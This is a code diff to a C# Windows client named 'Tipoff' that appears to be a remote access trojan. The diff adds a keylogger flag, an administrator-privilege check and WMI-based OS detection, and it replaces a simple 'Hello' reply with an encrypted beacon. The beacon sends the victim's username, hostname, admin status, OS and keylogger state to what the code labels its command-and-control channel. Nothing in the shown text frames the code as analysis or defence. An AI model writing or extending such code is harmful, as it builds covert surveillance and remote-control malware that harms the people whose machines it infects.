@@ -10,13 +10,14 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 
 using System.Security.Cryptography;
-
 using PacketDotNet;
 using SharpPcap;
 using System.IO;
 using System.Reflection;
 using System.Net;
 using System.Threading;
+using System.Security.Principal;
+using System.Management;
 
 namespace Tipoff
 {
@@ -27,6 +28,8 @@ namespace Tipoff
 
         private int m_nTimeout = 10000; //ms
         private int m_nRetry = 10000; //ms
+
+        private bool m_bKeylogger = bool.Parse("True");
 
         private string m_szPassword = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"; //"[SHA256_PASSWORD]";
 
@@ -43,6 +46,71 @@ namespace Tipoff
                 byte[] abHashed = sha256.ComputeHash(abData);
 
                 return BitConverter.ToString(abHashed).Replace("-", string.Empty).ToLower();
+            }
+        }
+
+        private string fnGenerateRandomStr(int nLength = 10)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            StringBuilder result = new StringBuilder(nLength);
+            Random random = new Random();
+
+            for (int i = 0; i < nLength; i++)
+            {
+                result.Append(chars[random.Next(chars.Length)]);
+            }
+
+            return result.ToString();
+        }
+
+        private bool fnIsAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        public static DataTable fnWmiQuery(string query)
+        {
+            DataTable dt = new DataTable();
+            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+            {
+                using (ManagementObjectCollection col = searcher.Get())
+                {
+                    foreach (ManagementObject obj in col)
+                    {
+                        DataRow dr = dt.NewRow();
+                        foreach (PropertyData prop in obj.Properties)
+                        {
+                            if (!dt.Columns.Contains(prop.Name))
+                            {
+                                dt.Columns.Add(prop.Name);
+                            }
+
+                            dr[prop.Name] = prop.Value?.ToString() ?? "N/A";
+                        }
+
+                        dt.Rows.Add(dr);
+                    }
+                }
+            }
+
+            return dt;
+        }
+
+        private string fnGetOS()
+        {
+            try
+            {
+                DataTable dt = fnWmiQuery("SELECT Caption FROM Win32_OperatingSystem");
+                string szOS = dt.Rows[0][0].ToString();
+
+                return szOS;
+            }
+            catch (Exception ex)
+            {
+                return "Unknown";
             }
         }
 
@@ -124,7 +192,16 @@ namespace Tipoff
                                 }
                                 else if (dsp.Param == 4)
                                 {
-                                    s.Send(3, 0, "Hello");
+                                    string szData = string.Join("|", new string[]
+                                    {
+                                        Environment.UserName,
+                                        Dns.GetHostName(),
+                                        m_bKeylogger ? "Yes" : "No",
+                                        fnIsAdmin() ? "Yes" : "No",
+                                        fnGetOS(),
+                                    });
+
+                                    s.encSend(3, 0, szData);
                                 }
                             }
                             else if (dsp.Command == 2) //COMMAND AND CONTROL
